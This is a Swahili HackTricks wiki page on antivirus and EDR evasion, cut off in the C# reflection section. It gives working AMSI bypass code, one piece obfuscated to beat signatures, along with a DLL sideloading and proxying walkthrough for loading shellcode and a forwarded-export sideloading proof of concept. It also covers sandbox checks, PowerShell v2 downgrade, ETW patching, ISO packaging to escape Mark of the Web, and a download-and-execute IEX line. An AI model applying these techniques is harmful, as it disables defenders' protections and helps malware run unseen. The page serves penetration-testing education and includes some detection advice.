# Kuikwepa Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzima Windows Defender ili isifanye kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzima Windows Defender kwa kuigiza AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Kwa sasa, AVs zinatumia njia tofauti za kukagua kama faili ni hatari au la: static detection, dynamic analysis, na kwa EDRs zilizo za juu zaidi, behavioural analysis.

### **Static detection**

Static detection inafanyika kwa kupigia alama nyuzi au safu za bytes zinazojulikana kama hatari ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mf. file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia zana za umma zilizo maarufu kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda zimetumikiwa na kuchambuliwa na kupigiwa alama kama hatari. Kuna njia kadhaa za kuepuka aina hii ya utambuzi:

- **Encryption**

Ikiwa utaficha (encrypt) binary, haitakuwa na njia AV za kugundua programu yako, lakini utahitaji aina fulani ya loader ili kuifungua (decrypt) na kuendesha programu ndani ya memory.

- **Obfuscation**

Mara nyingine yote unayohitaji ni kubadilisha baadhi ya strings ndani ya binary au script yako ili kuepuka AV, lakini hii inaweza kuwa kazi inayochukua muda kulingana na unachojaribu kuficha.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, haitakuwa na signatures mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kukagua kuhusiana na Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa kawaida inagawanya faili kuwa sehemu nyingi kisha inaagiza Defender iskanie kila sehemu kando-kando; kwa njia hii inaweza kukuambia hasa ni strings au bytes gani zilizo pangiliwa kama hatari kwenye binary yako.

Ninapendekeza sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni pale ambapo AV inaendesha binary yako ndani ya sandbox na inatazama shughuli hatarishi (mf. kujaribu kufungua (decrypt) na kusoma nywila za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya kazi nayo, lakini hizi ni baadhi ya mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kuepuka dynamic analysis ya AV. AV zina muda mfupi sana wa kuskania faili ili zisilete usumbufu kwa mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuharibu uchambuzi wa binaries. Tatizo ni kwamba sandboxes za AV nyingi zinaweza kupita juu ya sleep kulingana na jinsi zilivyotekelezwa.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kutumia (mf. < 2GB RAM), vinginevyo zingesababisha kuzipunguza mashine za watumiaji. Unaweza pia kuwa mkali katika ubunifu hapa, kwa mfano kwa kuchunguza joto la CPU au hata kasi za fan; sio kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kufanya ukaguzi wa domain ya kompyuta kuona kama inalingana na ile uliyoainisha; ikiwa haifai, unaweza kufanya programu yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, hivyo unaweza kuangalia jina la kompyuta kwenye malware yako kabla ya detonation; ikiwa jina linafanana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mikono mingine ya ushauri mzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali kwenye chapisho hili, **public tools** hatimaye zitakuwa **detected**, kwa hivyo, unapaswa kuuliza swali:

Kwa mfano, ikiwa unataka dump LSASS, **je, lazima utumie mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana sana ambao pia huunda dump ya LSASS.

Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni mojawapo ya, kama siyo ile iliyopigwa alama zaidi na AVs na EDRs; mradi wenyewe ni mzuri sana, lakini pia ni taabu kuufanya ufanye kazi ili kuzunguka AVs, hivyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **uzima automatic sample submission** katika defender, na tafadhali, kwa uzito, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kupata evasion kwa muda mrefu. Ikiwa unataka kukagua kama payload yako inagundulika na AV fulani, iweke kwenye VM, jaribu kuzima automatic sample submission, na iteste huko hadi utakapokuwa una kuridhika na matokeo.

## EXEs vs DLLs

Pale panapowezekana, daima **peana kipaumbele kwa kutumia DLLs kwa evasion**, kwa uzoefu wangu, faili za DLL kwa kawaida huwa **zinagundulika kidogo zaidi** na kuchambuliwa kidogo, kwa hivyo ni mbinu rahisi kutumia kuepuka utambuzi katika baadhi ya kesi (ikiwa payload yako ina njia ya kuendeshwa kama DLL bila shaka).

Kama tunaona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>mfanano wa antiscan.me wa Havoc EXE payload ya kawaida dhidi ya Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unaweza kutumia na faili za DLL ili kuwa stealth zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia mpangilio wa utafutaji wa DLL unaotumika na loader kwa kuweka programu ya mwathiriwa na malicious payload(s) kando kwa kando.

Unaweza kukagua programu zinazoweza kuathiriwa na DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL ambazo zinajaribu kupakia.

Ninapendekeza kwa nguvu **explore DLL Hijackable/Sideloadable programs yourself**, mbinu hii ni ya kimyakimya ikiwa itafanywa vizuri, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kukamatwa kwa urahisi.

Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia haitapakia payload yako, kwa sababu programu inatarajia functions maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapitisha miito ambazo programu inazofanya kutoka kwenye proxy (na DLL hatari) kwenda kwa DLL ya asili, hivyo kudumisha utendakazi wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Haya ni hatua niliofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa mafaili 2: DLL source code template, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote shellcode yetu (encoded with [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha utambuzi cha 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tuliyojadili kwa undani.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuashiria code, entry ya export ina string ya ASCII ya muundo `TargetDll.TargetFunc`. Wakati mtumiaji anapotatua export, Windows loader itafanya:

- Itapakia `TargetDll` ikiwa haijapakiwa
- Itatafuta `TargetFunc` kutoka kwake

Mambo muhimu ya kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwa namespace lililolindwa la KnownDLLs (mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` sio KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL unatumika, ambao unajumuisha directory ya module inayofanya utatuzi wa forward.

Hii inaruhusu primitive isiyo ya moja kwa moja ya sideloading: tafuta DLL iliyosainiwa inayotoa function iliyoforward kwenda jina la module lisilo la KnownDLL, kisha weka pamoja DLL hiyo iliyosainiwa na DLL inayodhibitiwa na mshambuliaji iliyoitwa hasa kwa jina kama module lengwa iliyo forwarded. Wakati forwarded export itakapoitwa, loader itatatua forward na kupakia DLL yako kutoka directory ile ile, ikitekeleza DllMain yako.

Mfano ulionekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, hivyo inatatuliwa kupitia mpangilio wa utafutaji wa kawaida.

PoC (copy-paste):
1) Nakili system DLL iliyosainiwa kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda ile ile. DllMain ndogo kabisa inatosha kupata utekelezaji wa msimbo; huna haja ya kutekeleza forwarded function ili kusababisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia zilizoshuhudiwa:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inaiendesha `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapata kosa la "missing API" tu baada ya `DllMain` tayari kuendesha

Vidokezo vya ufuatiliaji:
- Zingatia forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya forwarder ya Windows 11 kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mapendekezo ya utambuzi/utetezi:
- Monitor LOLBins (e.g., `rundll32.exe`) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Toa tahadhari juu ya mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na zuia write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia iliyofichwa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kuepuka kugunduliwa ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee chombo kimoja tu — inapowezekana, jaribu kuunganisha mbinu mbalimbali za kuepuka.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzo, AV zilikuwa zinaweza tu kupima **files on disk**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haingekuwa na uwezo wa kufanya chochote kuzuia hilo kwa sababu haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeingizwa katika sehemu hizi za Windows.

- User Account Control, au UAC (kupandishwa cheo kwa EXE, COM, MSI, au ufungaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo wakati wa utekelezaji)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia za script kwa kuonyesha yaliyomo kwenye script katika muundo usiosimbwa na usiofichwa.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutaonyesha onyo lifuatalo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoandika awali `amsi:` kisha njia ya executable kutoka ambapo script ilikimbizwa; katika kesi hii, powershell.exe

Hatukuweka faili lolote kwenye disk, lakini bado tuligunduliwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, msimbo wa C# unapitishwa kupitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa ajili ya load in-memory execution. Ndiyo sababu inashauriwa kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kwa in-memory execution ikiwa unataka kuepuka AMSI.

Kuna njia chache za kuepuka AMSI:

- **Obfuscation**

Kwa kuwa AMSI hasa hufanya kazi kwa kugundua kwa njia za static, hivyo kubadilisha scripts unazojaribu kuziyasha inaweza kuwa njia nzuri ya kuepuka utambuzi.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation hata kama kuna tabaka kadhaa, kwa hivyo obfuscation inaweza isiwe chaguo zuri kulingana na jinsi inavyofanywa. Hii inafanya isiwe rahisi kuepuka. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha majina ya vigezo vichache na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimepigwa alama.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kuingiza DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuiharibu kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa za juu. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka skanning ya AMSI.

**Forcing an Error**

Kulazimisha uanzishaji wa AMSI kushindwa (amsiInitFailed) kutasababisha hakutakuwa na skani itakayoznizwa kwa mchakato wa sasa. Hii awali ilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi ya upana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Kilichohitajika ni mstari mmoja tu wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu bila shaka umetambuliwa na AMSI yenyewe, hivyo mabadiliko yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyopata kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hii huenda itachomwa alama mara tu chapisho hili linapotoka, kwa hivyo haupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

Kuna pia mbinu nyingi nyingine zinazotumika bypass AMSI kwa powershell; angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuhusu hizo.

Chombo hiki [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) pia hutoa script za bypass AMSI.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia chombo kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwa kumbukumbu ya mchakato wa sasa. Chombo hiki kinafanya kazi kwa kuchambua kumbukumbu ya mchakato wa sasa kwa ajili ya saini ya AMSI kisha kuandika juu yake kwa NOP instructions, vipi kuiondoa kabisa kutoka kwa kumbukumbu.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia Powershell version 2**
Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha script zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa wadukuzi wanaotaka kuepuka kugunduliwa**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell bila ulinzi (hii ndicho `powerpick` kutoka Cobal Strike hutumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea encryption ya data, ambayo itaongeza entropy ya binary na kufanya kuwa rahisi kwa AVs na EDRs kuigundua. Kuwa mwangalifu na hili na labda tumia encryption tu kwenye sehemu maalum za msimbo wako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati unapoichambua malware inayotumia ConfuserEx 2 (au commercial forks), ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mtiririko wa kazi uliopo hapa chini unaweza kwa uhakika **kurejesha IL inayokaribiana na asili** ambayo baadaye inaweza ku-decompile kuwa C# katika zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Hii pia inabadilisha PE checksum hivyo mabadiliko yoyote yatayafanya binary ifanyike crash. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kupona XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output inajumuisha vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – ingiza faili *clean* kwa **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2  
• de4dot itafuta control-flow flattening, kurejesha namespaces, classes na majina ya variables za awali na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Zitoa kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyotokana chini ya dnSpy, tafuta Base64 blobs kubwa au `RijndaelManaged`/`TripleDESCryptoServiceProvider` matumizi ili kutambua payload ya *kweli*. Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyowekwa ndani ya `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx huunda attribute maalum iitwayo `ConfusedByAttribute` ambayo inaweza kutumiwa kama IOC kuotomatisha kuainisha sampuli.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya suite ya uundaji wa [LLVM] inayoweza kuongeza usalama wa programu kupitia [code obfuscation] na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa compile, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza safu ya obfuscated operations zinazotengenezwa na C++ template metaprogramming framework ambazo zitamfanya mtu anayetaka crack application kuwa na kazi ngumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate aina mbalimbali za PE files ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazotambulika na LLVM zinazotumia ROP (return-oriented programming). ROPfuscator inaobfuscate programu kwenye assembly code level kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzipakia

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka mtandao na kuzitekeleza.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications ambazo zinaweza kuwa hatarishi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen huvumilia hasa kwa njia ya msingi wa sifa (reputation-based), ikimaanisha kwamba applications ambazo hazipakwi mara kwa mara zitatikisa SmartScreen, hivyo kuwatangazia na kuzuia mtumiaji kuendesha faili (hata hivyo faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa moja kwa moja unapo pakua faili kutoka mtandao, pamoja na URL iliyotumika kupakua.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyopakuliwa kutoka mtandao.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizotiwa saini na **trusted** signing certificate **hazitatikisi SmartScreen**.

Njia yenye ufanisi mkubwa kuzuia payloads zako kupata Mark of The Web ni kuziweka ndani ya container kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo za NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni chombo kinachofunga payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kuvuka SmartScreen kwa kufunga payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanisma yenye nguvu ya logging katika Windows inayoruhusu programu na vipengele vya mfumo **kuandika matukio**. Hata hivyo, pia inaweza kutumika na bidhaa za usalama kufuatilia na kugundua shughuli hatarishi.

Vivyo hivyo jinsi AMSI inavyokatizwa (kuepukwa), pia inawezekana kufanya funksioni ya user space `EtwEventWrite` irudie mara moja bila kuandika matukio yoyote. Hii hufanywa kwa kupachika (patch) funksioni hiyo katika memory ili irudie mara moja, kwa ufanisi kuzima logging ya ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia binaries za C# ndani ya memory imekuwa ikitumiwa kwa muda na bado ni njia nzuri ya kuendesha post-exploitation tools bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kuzingatia kupatch AMSI kwa mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

